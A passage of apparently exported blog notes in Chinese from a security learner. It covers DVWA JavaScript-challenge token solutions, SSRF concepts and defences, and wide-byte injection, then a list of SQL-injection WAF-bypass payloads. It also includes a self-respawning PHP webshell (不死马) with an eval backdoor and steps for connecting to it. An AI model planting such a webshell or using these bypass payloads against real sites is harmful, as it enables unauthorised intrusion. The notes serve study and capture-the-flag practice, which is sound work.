<p>rot13：A换成N、B换成O、依此类推到M换成Z，然后序列反转：N换成A、O换成B、最后Z换成M。只有这些出现在英文字母里头的字元受影响；数字、符号、空白字元以及所有其他字元都不变。</p>
</blockquote>
<p>所以我们把success替换成<code>fhpprff</code>后md5加密替换token就会提示<code>well done</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(rot13(&#x27;success&#x27;))</span><br><span class="line">&#x27;38581812b435834ebf84ebcc2c6424d6&#x27;</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/DVWA/image-20220915104704156.png" alt="image-20220915104704156"></p>
<p>为什么其他字符串不行？应该是后台只存了success处理的结果进行比较。查看源码”index.php”发现确实是这样</p>
<h2 id="Medium-13"><a href="#Medium-13" class="headerlink" title="Medium"></a>Medium</h2><p>查看源码可以看到token的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">do_something</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="string">&quot;&quot;</span>,n=e.<span class="property">length</span>-<span class="number">1</span>;n&gt;=<span class="number">0</span>;n--) t+=e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="title function_">do_elsesomething</span>(<span class="string">&quot;XX&quot;</span>)&#125;,<span class="number">300</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">do_elsesomething</span>(<span class="params">e</span>)</span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span>=<span class="title function_">do_something</span>(e+<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span>+<span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>do_something函数把参数e反转后输出</p>
<p>do_elsesomething函数把（参数e+用户输入的phrase+”XX”）后经do_somethong处理后赋值给token</p>
<p>抓包后可以看出参数e是“XX”</p>
<p>所以只需要把<code>success</code>经上述步骤处理后（即<code>XXsseccusXX</code>）赋值给token就行</p>
<p><img data-src="/../images/DVWA/image-20220915105613414.png" alt="image-20220915105613414"></p>
<h2 id="High-13"><a href="#High-13" class="headerlink" title="High"></a>High</h2><p>High的JS看的有点想西内，应该是被加密或者混淆了</p>
<p>在<a href="http://deobfuscatejavascript.com/">这</a>可以解混淆</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">do_something</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.<span class="property">length</span> - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_3</span>(<span class="params">t, y = <span class="string">&quot;ZZ&quot;</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">sha256</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> + y)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_2</span>(<span class="params">e = <span class="string">&quot;YY&quot;</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">sha256</span>(e + <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_1</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">do_something</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">token_part_2</span>(<span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;send&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, token_part_3);</span><br><span class="line"><span class="title function_">token_part_1</span>(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br></pre></td></tr></table></figure>

<p>大概就是<code>phrase</code>默认为空，用户输入”success”，由于setTimeout函数有300毫秒延时，所以先执行了token_part_1(“ABCD”, 44)，<code>token</code>从”success”-&gt;”sseccus”，然后执行token_part_2(“XX”)，”XX”和<code>token</code>拼接后sha256加密，然后用户点击的时候执行token_part_3()，<code>token</code>再次和”ZZ”拼接后进行sha256加密。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;success&#x27;-&gt;&#x27;sseccus&#x27;-&gt;sha256(&#x27;XXsseccus&#x27;)-&gt;sha256(sha256(&#x27;XXsseccus&#x27;)+&#x27;zz&#x27;)</span><br><span class="line">&#x27;ec7ef8687050b6fe803867ea696734c67b541dfafb286a0b1239f42ac5b0aa84&#x27;</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/DVWA/image-20220915110012762.png" alt="image-20220915110012762"></p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="服务器端请求伪造-SSRF"><a href="#服务器端请求伪造-SSRF" class="headerlink" title="服务器端请求伪造(SSRF)"></a>服务器端请求伪造(SSRF)</h2><p>攻击者引诱后端服务器向其他后端发送伪造的请求称为SSRF。往往是向内网核心区建立请求连接，或使服务器主动连接外部系统，泄露敏感信息。</p>
<blockquote>
<p>CSRF：是由客户端发起的跨站伪造请求，引诱其他用户执行恶意操作。<br>SSRF：是由后端服务向内网其他服务器发起伪造请求，引发内网间的未授权访问、敏感信息泄露等。</p>
</blockquote>
<p>利用后端服务器间默认的信任关系，去引诱一台服务器向另一台服务器或内部系统发送访问的请求，实现未授权访问或获取敏感信息。这种攻击可以针对被引诱的服务器自身，也可针对内部有信任关系的其他系统。</p>
<p><strong>防御：</strong></p>
<p>1.限制协议：</p>
<p>限制请求的端口只能为Web端口，只允许访问 HTTP和HTTPS 的请求，禁止其他协议。</p>
<p><a href="https://baijiahao.baidu.com/s?id=1666024412704315446">Gopher协议</a></p>
<p>2.限制IP：</p>
<p>目的：避免应用被用来获取内网数据，攻击内网。</p>
<p>对传入的url进行过滤，将符合内网IP特征的信息过滤掉。</p>
<p>3.限制端口：</p>
<p>限制请求的端口为http常用的端口，比如80、443、8080、8090等。</p>
<p>对于其他异常端口则进行过滤，如3306等。</p>
<p>4.过滤返回信息：</p>
<p>验证并过滤远程服务器对请求的响应，是比较简单防御方法。比如说原本服务器这个功能是用来识图的，那么如果接受到的响应发现不是一张图片，则过滤掉。</p>
<p>5.统一错误信息：</p>
<p>避免攻击者根据错误信息来判断远端服务器的端口状态，比如错误信息全部改为404。</p>
<h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;.ZYGS.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;zygs&quot;])==&quot;e10adc3949ba59abbe56e057f20f883e&quot;)&#123;@eval($_POST[&quot;ZYGS&quot;]);&#125;?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>ignore_user_abort(true);   &#x2F;&#x2F;设置与远程客户端断开后是否继续执行脚本，true即不断开<br>set_time_limit(0);   &#x2F;&#x2F;设置脚本最大的执行时间，0即没有时间限制 @unlink(<strong>FILE</strong>);<br>&#x2F;&#x2F;删除文件本身 $file &#x3D; ‘.ZYGS.php’;   &#x2F;&#x2F;文件名是.ZYGS.php $code &#x3D; <?php ?>;<br>&#x2F;&#x2F;php代码 file_get_contents(file,code);   &#x2F;&#x2F;打开file文件，然后写入code<br>usleep(5000);   &#x2F;&#x2F;每隔usleep(5000)写入一个新文件</p>
</blockquote>
<p>这段代码是为了防止骑马(乌鸦坐飞机)，通过判断用户传入的变量，然后转换成md5值和e10adc3949ba59abbe56e057f20f883e进行对比，如果e10adc3949ba59abbe56e057f20f883e解密出来的值和用户传入的值是一样的话，就继续执行@eval($_POST[‘ZYGS’]),这也是整个不死马中的灵魂，就是为了防止乌鸦坐飞机，一个人拿分(e10adc3949ba59abbe56e057f20f883e &#x3D;&#x3D; 123456)</p>
<p>连接方式<br>当不死马成功上传到服务器之后，访问文件路径 123.321.123.321&#x2F;upload&#x2F;.zygs.php，此时已经开始生成不死马.ZYGS.php了,并且传入的.zygs.php已经被unlink删除<br>然后打开蚁剑，输入123.321.123.321&#x2F;upload&#x2F;.ZYGS.php?zygs&#x3D;123456，密码就是ZYGS，直接连接就完事了</p>
<h2 id="sqlmap-–level"><a href="#sqlmap-–level" class="headerlink" title="sqlmap –level"></a>sqlmap –level</h2><p>级别<br>选项：–level<br>使用这个选项需要给出一个参数用于指定即将进行检测的级别。总共有五个级别。</p>
<p>默认的级别是 1，该级别只会进行简单的检测（请求）。与之不同的是，级别 5 会更详细地对更大范围 payloads 和 boundaries（作为 SQL payload 的前缀和后缀）进行检测。sqlmap 使用的 payloads 直接从文本文件 xml&#x2F;payloads.xml 中载入。根据该文件顶部的相关指导说明进行设置，如果 sqlmap 漏过了特定的注入，你可以选择自己修改指定的 payload 用于检测。</p>
<p>这个选项设置不止会影响 sqlmap 使用的 payload，还会影响到相关的测试注入点：总是测试 GET 和 POST 的相关参数，级别大于等于 2 则会测试 HTTP Cookie 头部，级别大于等于 3 则会测试 HTTP UserAgent&#x2F;Referer 头部值。</p>
<p>总而言之， 如果 SQL 注入检测的难度越高，则需要设定越高的 –level 值。</p>
<p>强烈建议在向 sqlmap 邮件列表反馈 sqlmap 无法检测到特定类型的注入之前，尝试设定一个更高的 –level 值用于检测。</p>
<h2 id="sqlmap-–purge"><a href="#sqlmap-–purge" class="headerlink" title="sqlmap –purge"></a>sqlmap –purge</h2><p><a href="https://www.bbsmax.com/A/1O5ENAr4d7/">sqlmap手册</a><br>清除缓存注入</p>
<h2 id="宽字符注入"><a href="#宽字符注入" class="headerlink" title="宽字符注入"></a>宽字符注入</h2><p><a href="https://blog.csdn.net/Fighting_hawk/article/details/123026788">宽字节注入</a><br>正常情况下GPC开启或者使用addslashes函数过滤GET或POST提交的参数时，我们测试输入的<code>&#39;</code>，就会被转义为<code>\&#39;</code>，无法成功闭合或者说逃逸。一般这种情况是不存在注入可能的，但是有一种情况除外，就是当后台数据库编码格式为GBK时，可以添加字符欺骗转义函数，<code>&#39;</code>等不被转义。</p>
<p>转义函数</p>
<blockquote>
<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串<br>预定义字符包括单引号（’）双引号（”） 反斜杠（\） NULL</p>
</blockquote>
<blockquote>
<p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符<br>对特殊符号<code>\x00,\n,\r,\\,’,”,\x1a</code>进行转义<br>不转义<code>%,_</code><br>mysql_escape_string() 转义一个字符串</p>
</blockquote>
<p>当某字符的大小为一个字节时，称其字符为窄字节.<br>当某字符的大小为两个字节时，称其字符为宽字节.<br>所有英文默认占一个字节，汉字占两个字节<br>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等</p>
<p>如果数据库使用的的是GBK编码而PHP编码为UTF8就可能出现注入问题，原因是程序员为了防止SQL注入，就会调用我们上面所介绍的几种函数，将单引号或双引号进行转义操作，转义无非便是在单或双引号前加上斜杠（\）进行转义 ，但这样并非安全，因为数据库使用的是宽字节编码，两个连在一起的字符会被当做是一个汉字，而在PHP使用的UTF8编码则认为是两个独立的字符，如果我们在单或双引号前添加一个字符，使其和斜杠（\）组合被当作一个汉字，从而保留单或双引号，使其发挥应用的作用。但添加的字符的Ascii要大于128，两个字符才能组合成汉字 ，因为前一个ascii码要大于128，才到汉字的范围 ，这一点需要注意。比如说最经典的<code>%df</code>。</p>
<h2 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h2><p><a href="https://baijiahao.baidu.com/s?id=1704494996023462822&wfr=spider&for=pc">参考</a></p>
<p><strong>1.绕过空格（注释符&#x2F;* *&#x2F;，%a0）</strong></p>
<p>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格</p>
<p><strong>2.括号绕过空格</strong></p>
<p>如果空格被过滤，括号没有被过滤，可以用括号绕过。在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格</p>
<p><strong>3.引号绕过（使用十六进制）</strong></p>
<p>会使用到引号的地方一般是在最后的where子句中，遇到这样的问题就要使用十六进制来处理这个问题，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select column_name from information_schema.tables where table_name=&quot;users&quot;</span><br><span class="line">select column_name from information_schema.tables where table_name=0x7573657273</span><br></pre></td></tr></table></figure>

<p><strong>4.逗号绕过（使用from或者offset）</strong></p>
<p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决</p>
<p><strong>5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）</strong></p>
<p>使用greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
<p><strong>6.or and xor not绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and=&amp;&amp;</span><br><span class="line">or=||</span><br><span class="line">xor=|</span><br><span class="line">not=!</span><br></pre></td></tr></table></figure>

<p><strong>7.绕过注释符号（#，–(后面跟一个空格））过滤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3||&#x27;1</span><br></pre></td></tr></table></figure>

<p><strong>8.&#x3D;绕过</strong></p>
<p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p>
<p><strong>9.绕过union，select，where等</strong></p>
<p>（1）使用注释符绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//，-- , /**/, #, --+, -- -, ;,%00,--a用法：</span><br></pre></td></tr></table></figure>

<p>（2）使用大小写绕过</p>
<p>（3）内联注释绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/likedatabase()#</span><br></pre></td></tr></table></figure>

<p>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）</p>
<p><strong>10.通用绕过（编码）</strong></p>
<p>如URLEncode编码，ASCII,HEX,unicode编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">or 1=1：%6f%72%20%31%3d%31</span><br><span class="line">Test：CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</span><br></pre></td></tr></table></figure>

<p><strong>11.等价函数绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line">@@user ==&gt; user()</span><br><span class="line">@@datadir ==&gt; datadir()</span><br></pre></td></tr></table></figure>

<p><strong>12.宽字节注入</strong></p>
<p><strong>13.多参数请求拆分</strong></p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET：a=[input1]&amp;b=[input2]</span><br><span class="line">SQL：and a=[input1] and b=[input2]</span><br><span class="line"></span><br><span class="line">a=union/*&amp;b=*/select1,2,3,4</span><br><span class="line">and a=union /*and b=*/select1,2,3,4</span><br></pre></td></tr></table></figure>

<p><strong>14.HTTP参数污染</strong></p>
<p>HTTP参数污染是指当同一个参数出现多次，不同的中间件会解析为不同的结果。</p>
<p><img data-src="https://pics5.baidu.com/feed/c75c10385343fbf24af4ab2ac043098864388fa1.jpeg?token=2667063c99dccb430c54db2ed00c381f" alt="img"></p>
<p>可见，IIS比较容易利用，可以直接分割带逗号的SQL语句。在其余的中间件中，如果WAF只检测了通参数名中的第一个或最后一个，并且中间件的特性正好取与WAF相反的参数，则可成功绕过。</p>
<p>下面以IIS为例，一般的SQL注入语句如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Inject=union select1,2,3,4</span><br><span class="line">Inject=union/*&amp;inject=*/select/*&amp;inject=*/1&amp;inject=2&amp;inject=3&amp;inject=4</span><br><span class="line">IIS：Inject=union/*, */select/*, */1,2,3,4</span><br></pre></td></tr></table></figure>

<p><strong>15.生僻函数</strong></p>
<p>使用生僻函数替代常见的函数，例如在报错注入中使用polygon()函数替换常用的updatexml()函数</p>
<p><strong>16.寻找网站源IP</strong></p>
<p>对于具有云WAF防护的网站，只要找到网站的IP地址，通过IP访问网站，就可以绕过云WAF检测。</p>
<p>常见的寻找网站IP的方法由以下几种</p>
<p>寻找网站的历史解析记录多个不同区域ping网站，查看IP解析的结果找网站的二级域名、NS、MX记录等对应的IP订阅网站邮件，查看邮件发送方的IP</p>
<p><strong>17.注入参数到cookie中</strong></p>
<p>某些程序员在代码中使用<code>$_REQUEST</code>获取参数，而<code>$_REQUEST</code>会依次从GET&#x2F;POST&#x2F;cookie中获取参数，如果WAF只检测了GET&#x2F;POST而没有检测cookie,则可以将注入语句放入cookie中进行绕过。</p>
]]></content>
      <tags>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/08/30/hello-world/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="3fbf53f127f9724098f1685893429b30cd0981d9136b5965b537eb10218c09c3">165d50f05814027fb7fe5e4ae8a088d83a3c45e1f62d098feb303294e4ed6e4f25c65523774c3d6ea870bc5736ab28c0c9d794c41287fea5c81920506ddf2623ce7f92c59285f1791066d6d5cedb691ed56b6cfd48a4d8aee54788f02cd7988ff0a5e44165a0d41640c586e68e587f72282fef9f4334df3f5c52c28b0e47bb5a872cdcf183526aefffaa49fd2b83f3fc9e38be672677af6778a9ccf7dcc5da2d4db1f6b31a6c80bf842cab813b239cad1622475c59655a171d83c059b9da884fa4e1815bcba998ca242b8ef1ab2744f1a66cd2f370e099e1ee3b8875a2d30e40122dcaba723ca2fb973019f1ca39197381a0bcf661d35835a1e002e529a08addd1877d1b22e23b3d5ce23f2ab807bfdf45111fb1dd1c1b71ccad2c0f655929d566e83b9526db4dbf046de778ae74b15755372a95a241a820d6fcdca835f7cfd54cd5db7f84bfe627a613be8bd99c7627d1869606eddf538097e27d7c35fb31bd26842e2a40ef31457feffce2ee0298f59bbd668ac3c0630ada2e31b5e6e17cdfe56aedb2d08284dd8442652567a266d52272469129de37c0a022e61dfcc52702fcaa7277c824c7e9db5b01d45f02ca9b135778b50b0bfde509cc7ec807d089ab3d79a261493a795985b3aeb99cfffcdd4df27ffe10f036430be74b38cf8736dc01a7bd825903217ec8dd39410177bbd18fd0465383f852320694a7f5cdf71d4c1e09b3d9c851cb81f494eee6baecd526e554e609f66eebfa1128435108ecf9b1f6a6cbd6bec3e126cc4d7413390426bfe99e79cf1ca31dc32bca2b638f48b34d428b9901291050be054092daa42b79f58ace5f776b46d4050316df3b4fb494071d3a99b203512f6a90dd1bd570050514a1bc91d1e47adcca47475c423c661ea142498328a7a396a54eb2fa3c5b812bb70c57558f1457ab3b2657b8e232c20ed64e699a70585de813988aefa6e129b3f55fff0b00f0e4f767fa735082a838efbf6617a4d16f0737543a7c6b3332b7f6c355a864ec7378e36d0afdf3ecc9e765dea86e68f212cf5b1e6bd7b5b5a317ed33cabc9ed4f7e7813402f156f5b124d10551df5d83e1c8e9e14d4e6e3f05d4a37b6d169995c11f87edd2341007f7442814cd1cf0fe871cc6f20205ed8c3657eb24eb400a0f53bc40ba142429320bbb6735382c29dc8d676d0e51a435ebd839a7ec22dede032d856365d1ffaf3a6d131bd04ff2a0f89c8aad0b3844ec2c57866adcfd4799e37407a5f1951071edaad14517f586d8efb3be3dd8629d2349cb96195dbaba39a4044d2955fbe2b8a94e1a4dcf5c887eff8dc6ac33fe5696284c1a3ecc977ec4dcba77add868d19985740505cd8b1fa1a417323076be25f37f5f2438c72bf2914f91e4592e36eae0125580583737bb1b2bd40b30f2ac2651d2bb5984e5b4646fb2141cf549e362430e9013bfc9bdc236beb7e2f77735816a75135adf23f2b6b010c4e270e0fe3679a84d2228c857e53f0d90c83e84d13e3cdbcd865128c56d7dbfe9c76f6a4539adaff73aabeb8475435b03a78d5029953c971ca6cbbf8a1df5a241a6c497cf0c987e336f49fee04fb2e752350399c01d7a1ecf778d80236af519fc6c55273b8a6e73f281e95f7921603499f43231d001703206dd1e9572491f1525cc81a7e7c1604a862cd32f59baccadbaa3cf6d82efae304b34cbc3064dbee3eecd52d18c4c5d0a87a015c0eea0a011599df9e4ebf0f1566555f869f759d2469ccaf392fbb08f6b711aecf59cb00e6941c9404d1957552f6054b7ef4de505c555ddbedf7512c0f019f16aaa9ffacf09de51c6127bae45299a33f6382d50f28fd4b776bf2e56d4423d9b9ce1038587bc210da79a2932572f937ca149bd6f5c4fc4f3c2264cc7b1616c1efc912d3d737c5c9bbd3a21e51b4f09fa1f0a7e52989d5ca8582978f25046495f571a69c16a2bd2d3f9f25e6d5d067e040224bb5e20e5a669ca00d49dd99355566c9f1871f7ef7c4ddf4535d0a7a1311d3d84bbd7fc65aa6d2d161672987e7a21b8381ae160026ccafcdac757931bdb27739a69e3c964328334995bcfdd5d7d8fae15d9e3d870611e8be36b3d62417c617a9fb2102422968a536d14677ed1768cdfa95a226270025663299478f2c2afcfe1a18e36946db6122f5aa8fa163085623562a3fb451d4d0abb8cd151d7be212d73d6d5db72ac4560468f4793ac476a2eb2ee19f5e8a3c6b6eeac74394e62693e741e5f018d2ee9c72dc84447d43dcf5523e517fc4485e48962a111da629db5c7103852c98728b7d68ebc064a5c59e5f59154497ec495b8e72f1c7972a00c5897971e7463572a1542f456fd7449b757d7cec20c70d4183f4794826ed8bb39413713dd44fdced93e7e84084bc4f297d7b3e2e5c2ae378afbd71aac3f7ade48f1fa3c1aae001a5a7a65fb247cd6d3167a0ba65d224a32836882664b57727d692b2a469610c4727ea89a5b952066545adc60a09161419201779766389aa0ae0bcaf4e41f0770876a169fe3a3aa52819c7c464616b58dbfbb363c2878c7b162c3a5f7b8e3db9bbb8e021a9af8463853b0abd6deeba6a5bc8adedc1e47d9eed3dc20110ab823fd2685067c34d6cb3db4d871ed3b0a904bafb4a482cec76a8bea9cc87a6374ba83709294c38870cb329182fe0930257f2034b8f259483b420d14836c5dc8159f065b7c2c517b344b624b48a4e2cfdddc46713cc91ea821f93370080d1140345c36b00aed50b89595dfe2655869053590f8469528412ef1308e8084333c69178d5d9ad290204b9ecad6ced99f2a170b13d067523628ce98a464aa0e4d8ef43202cfc50d8c830cd74800b1ca4ab75c2f710a6b8431cb21af49bf95db7fee5fa4818ad7866fa9f90476bb7c897ea0ce5ef2fceffa53ab46257e6baa5816154149e5180bded67e886bc4e31c36f3fceb5f731d6b04cd5692134497284b76225c3c899e1bcd66aa3b86982068c058c084e289ff610badfd5a62e3fccb256670955b71e0db5d5f75fefc5ddec6307a4ac955e160a5b39384b38daca1a44bc99002bee1270c899a1a8c1e2f552ff834efeb151506fd3951d7635cb746cb40afe5cd7b824abb96ea024664f6a3e7110302c5692ecbbf7219884013eee34c1079a4b5d62fd0065e3ed6824392f0f8267edf8840fe1432314f267dc6eb7b300261f576c14ac6aab9ef8909f0d9eba86dcbcbc9fe</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>Linux/kali/docker</title>
    <url>/2022/08/31/Linux-kali-docker/</url>
    <content><![CDATA[<center>Linux/kali/docker环境部署/使用/问题</center>

<span id="more"></span>

<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p><a href="https://blog.csdn.net/yyf960126/article/details/80908823">查看端口占用</a></p>
<p><a href="https://blog.csdn.net/qq_19446965/article/details/118586678">su 鉴定故障解决办法</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/a1809032425/article/details/122729307">Linux下切换Python版本的几种方法</a></p>
<p><a href="https://www.jianshu.com/p/20f2186d9cbb">Linux 换源方法</a></p>
<p><a href="https://blog.csdn.net/weixin_34910922/article/details/116610670">apt-get install的默认安装路径</a></p>
<h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><h2 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h2><p><a href="https://www.iculture.cc/cybersecurity/pig=205">kali安装burpsuite pro v1.7.37</a></p>
<p><a href="https://www.cnblogs.com/z9m8r8/p/15140805.html">kali安装burpsuite</a></p>
<p><a href="https://blog.csdn.net/weixin_61835841/article/details/124383328">kali安装burpsuite专业版</a></p>
<p><a href="https://blog.csdn.net/qq_53079406/article/details/123952809">burpsuite安装可能遇到的问题</a></p>
<p><a href="https://cloud.tencent.com/developer/ask/sof/295378">错误:选项-Xbootclasspath&#x2F;p</a></p>
<p><a href="https://blog.csdn.net/weixin_43601010/article/details/125514325">Burp Suite 自带浏览器沙盒sandbox问题的解决</a></p>
<h2 id="java-x2F-python"><a href="#java-x2F-python" class="headerlink" title="java&#x2F;python"></a>java&#x2F;python</h2><p><a href="https://blog.csdn.net/qq_34965596/article/details/117049617">切换java&#x2F;python版本</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --config java</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --config python</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/m0_56641407/article/details/123456673">kali 卸载原装Openjdk11 并安装Oraclejdk11</a></p>
<h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><p><a href="https://blog.csdn.net/weixin_46017292/article/details/122532482">Docker安装AWVS</a></p>
<p><a href="https://www.pudn.com/news/6228d5a59ddf223e1ad1e469.html">Docker更新nessus</a></p>
<h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><p><a href="https://www.cnblogs.com/kkdaj/p/16260681.html">Navicat Premium 16</a></p>
<p><a href="https://www.likecs.com/show-203417046.html">VMware虚拟机端口映射（NAT设置）</a></p>
<p><a href="https://blog.csdn.net/xuchaoxin1375/article/details/112004456">vmware关闭侧通道缓解(windows端)</a></p>
<p><a href="https://blog.csdn.net/weixin_46827107/article/details/114038896">换行与回车的区别</a></p>
<blockquote>
<p>回车可以写成CR，即Carriage Return，\r</p>
<p>换行可以写成LF，即Line Feed，\n</p>
<p>回车是把光标移到开始，换行是跳到下一行</p>
</blockquote>
<h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><p><a href="https://blog.csdn.net/studyvcmfc/article/details/123482104">ubuntu18.04在终端安装pip3时404 Not Found</a></p>
<p><a href="https://blog.csdn.net/weixin_45043549/article/details/104371704">安装出现:Requirement already satisfied 的解决办法</a></p>
<p><a href="https://blog.csdn.net/qq_35104586/article/details/107441178">pip 命令和参数整理</a></p>
<h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><p><a href="https://blog.csdn.net/qq_52671379/article/details/123905705">upload-labs</a></p>
